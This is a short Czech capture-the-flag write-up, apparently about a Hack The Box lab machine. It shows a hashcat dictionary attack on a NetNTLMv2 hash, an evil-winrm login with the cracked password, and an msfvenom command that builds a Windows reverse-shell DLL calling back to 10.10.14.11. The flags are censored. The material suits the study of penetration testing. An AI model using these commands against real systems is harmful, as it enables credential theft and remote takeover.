### Lámání hesel nebo hashů
Pokud mám hash nebo šifrovaný soubor, slovníkový útok může odemknout další krok útoku.
`hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt`
```
=> liltony
```

### Přihlášení na cíl
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`evil-winrm -u tony -p liltony -i 10.10.11.106`

### Získání user flagu
Tímto potvrzuji úspěšný uživatelský přístup.
`cat user.txt`
```
__CENSORED__
```

### Spuštění exploitu
Zde dochází k praktickému zneužití zranitelnosti.
`msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=4000 -f dll > rev64.dll`

### Získání root flagu
Tímto potvrzuji úplné ovládnutí stroje.
`more root.txt`
```
__CENSORED__
```
